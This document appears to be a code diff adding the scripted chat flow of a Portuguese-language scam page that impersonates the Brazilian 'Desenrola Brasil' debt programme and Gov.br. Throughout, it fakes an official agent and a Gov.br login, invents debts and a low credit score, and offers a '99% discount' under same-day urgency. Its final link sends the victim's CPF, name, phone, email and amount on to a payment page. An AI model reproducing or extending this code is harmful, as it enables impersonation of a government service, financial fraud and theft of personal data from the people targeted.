+    if(right){wrap.style.display='flex';wrap.style.justifyContent='flex-end'}else wrap.style.marginLeft='37px';
+    var row=document.createElement('div');row.className=wide?'btn-row':'btn-row row-inline';
+    options.forEach(function(opt){
+      var btn=document.createElement('button');btn.className='chat-btn'+(wide?' wide solid':'')+((!wide&&solid)?' solid':'');
+      btn.textContent=opt;btn.onclick=function(){wrap.remove();addUser(opt);resolve(opt)};row.appendChild(btn);
+    });
+    wrap.appendChild(row);msgs.appendChild(wrap);scroll();
+  });
+}
+
+async function botSay(html){addTyping();await sleep(1200);removeTyping();botRow('<div class="bubble-bot">'+tag(html)+'</div>');await sleep(900)}
+
+function startChat(){
+  CODIGO_ACORDO=codeFromCPF(CPF);
+  try{var el=document.getElementById('nomeUsuario');if(el)el.textContent=NOME.split(' ')[0]||'Usuário'}catch(_){}
+
+  setTimeout(startFlow,400);
+}
+
+async function startFlow(){
+  addImage('images/image1.png');
+  await botSay('Olá {NOME_COMPLETO}, esse é um canal oficial de atendimento do <strong>Desenrola Brasil</strong> e os seus dados estão seguros conosco. 🔒');
+  await botSay('Aguarde em alguns instantes, um de nossos atendentes entrará na conversa..');
+  addVideoAutoplay('media/video15.mp4');
+  addSystem('<em><strong>(Atendente Letícia entrou na conversa..)</strong></em> 💬');
+  addTyping();await sleep(17000);removeTyping();
+
+  var confirmWrap=document.createElement('div');confirmWrap.style.marginLeft='37px';confirmWrap.style.marginBottom='8px';
+  var cCard=document.createElement('div');cCard.className='confirm-card';
+  cCard.innerHTML='<span class="confirm-title">Para continuar, confirme seus dados:</span><strong>Nome:</strong><span>'+NOME_COMPLETO+'</span><strong>CPF:</strong><span>'+CPF_FORMATADO+'</span>'+(NASC?'<strong>Data de Nascimento:</strong><span>'+formatData(NASC)+'</span>':'');
+  var btnsC=document.createElement('div');btnsC.className='confirm-btns';
+  ['Sim, está correto.','Não sou eu'].forEach(function(label){
+    var btn=document.createElement('button');btn.className='chat-btn'+(label.indexOf('Sim')===0?' solid':'');btn.textContent=label;
+    btn.onclick=function(){btnsC.remove();addUser(label);
+      if(label.indexOf('Sim')===0)continueFlow();
+      else setTimeout(async function(){await botSay('Por favor, acesse o site com o seu CPF para prosseguir.');setTimeout(function(){goToStep('entrar')},1500)},600);
+    };btnsC.appendChild(btn);
+  });
+  confirmWrap.appendChild(cCard);confirmWrap.appendChild(btnsC);msgs.appendChild(confirmWrap);scroll();
+}
+
+async function continueFlow(){
+  await sleep(500);
+  await botSay('Obrigada!');
+  await botSay('Aguarde... Entrando em sua conta Gov.br');
+  await botSay('<strong>Login efetuado com sucesso!</strong>');
+  await botSay('<strong>{NOME_COMPLETO}</strong><br>Seja bem vindo(a) a sua conta Gov.br');
+  await botSay('Negocie dívidas com as seguintes empresas:');
+  addImage('images/image2.png');
+  await addButtons(['CONTINUAR'],false,true,true);
+  await addAudioWithButton('media/Desktop2026.mp3','SIM! QUERO NEGOCIAR');
+  await botSay('<em>Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..</em>');
+  await sleep(3000);await botSay('<em>Consultando..</em>');await sleep(3000);
+  await botSay('<strong>Análise concluída!</strong>');await sleep(3000);
+  await botSay('Identificamos <strong>4 dívidas ativas</strong> no sistema. Os valores variam entre <strong>R$ 1.728,74 a R$ 5.278,23</strong> de dívida <strong>em seu CPF.</strong>');
+  await sleep(3000);
+  infoCard([{text:'Situação para CPF:',style:'label'},{text:'{CPF_FORMATADO}',style:'value'},{text:'NEGATIVADO.',style:'bold'}]);
+  await botSay('Segundo nossos registros, seu SCORE é considerado muito baixo <strong>(alto risco para crédito):</strong>');
+  addImage('images/score.jpg');
+  await botSay('Você deseja verificar se existe algum acordo com desconto disponível para você?');
+  await addButtons(['BUSCAR ACORDO'],false,true,true);
+  await botSay('<em>Por favor, aguarde enquanto nosso sistema verifica se existem acordos disponíveis para você...</em>');
+  await botSay('<strong>Acordo encontrado!</strong>');
+  infoCard([{text:'1 (um) acordo foi encontrado para:',style:'bold'},{text:'{NOME_COMPLETO}',style:'value'},{text:'CPF: {CPF_FORMATADO}',style:'value'}]);
+  await addButtons(['VER ACORDO'],false,true,true);
+  await addAudioThen('media/buscaacordo.mp3',async function(){
+    await botSay('Parabéns <strong>{NOME_COMPLETO}!</strong><br><br>Pode comemorar! Encontramos um <strong>SUPER ACORDO DE 99% DE DESCONTO</strong> para você!');return Promise.resolve();
+  });
+  await botSay('<em>Acessando o acordo <strong>{CODIGO_ACORDO}</strong>...</em>');
+  await botSay('Informações do acordo <strong><em>{CODIGO_ACORDO}</em></strong> para ({NOME_COMPLETO})<br><br>(CPF: {CPF_FORMATADO})');
+  await botSay('O contrato atual é válido apenas para o titular: <strong>{NOME_COMPLETO}</strong> portador(a) do CPF: <strong>{CPF_FORMATADO}</strong>');
+  await botSay('Você gostaria de realizar o seu acordo com <strong>99% DE DESCONTO</strong> para quitar <strong>todas</strong> as suas dívidas e ter seu nome limpo novamente por apenas <strong>{VALOR}</strong>?');
+  await addButtons(['CONFIRMAR O ACORDO E LIMPAR O NOME'],false,true,true);
+  await addAudioThen('media/parabens.mp3',async function(){
+    await botSay('<strong>Acordo confirmado com sucesso!</strong>');return await addButtons(['CONTINUAR'],false,true,true);
+  });
+  await addAudioThen('media/pagamento.mp3',async function(){
+    infoCard([{text:'Acordo confirmado: {CODIGO_ACORDO}!',style:'label'},{text:'Beneficiário(a):',style:'label'},{text:'{NOME_COMPLETO}',style:'bold'},{text:'Identificação (CPF):',style:'label'},{text:'{CPF_FORMATADO}',style:'bold'},{text:'Quitação de todas as dívidas em ativo no CPF.',style:'value'},{text:'895 Pontos no score.',style:'bold'},{text:'Valor da proposta: {VALOR}',style:'label'}]);
+    return await addButtons(['CONTINUAR PARA O PAGAMENTO'],false,true,true);
+  });
+  await addAudioThen('media/aviso.mp3',async function(){
+    await botSay('<strong><em>Atenção!</em></strong> <em>Oferta Válida Apenas para hoje.</em>');
+    return await botSay('<em>Clique no botão abaixo para acessar a próxima tela e realizar seu pagamento</em>');
+  });
+  await sleep(600);
+  var nextP=new URLSearchParams();
+  nextP.set('cpf',CPF);nextP.set('nome',NOME_COMPLETO);nextP.set('phone',PHONE);nextP.set('email',EMAIL);nextP.set('valor',VALOR);nextP.set('acordo',CODIGO_ACORDO);
+  KEYS.forEach(function(k){if(P[k]&&!nextP.has(k))nextP.set(k,P[k])});
+  var qs='?'+nextP.toString();
+  var finRow=document.createElement('div');finRow.style.marginLeft='37px';finRow.style.marginBottom='8px';
+  var finA=document.createElement('a');finA.href='../pagamento/'+qs;finA.className='btn-link-final';finA.textContent='REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME';
+  finRow.appendChild(finA);msgs.appendChild(finRow);scroll();
+}
+
+})();
+</script>
+
+
+</body></html>
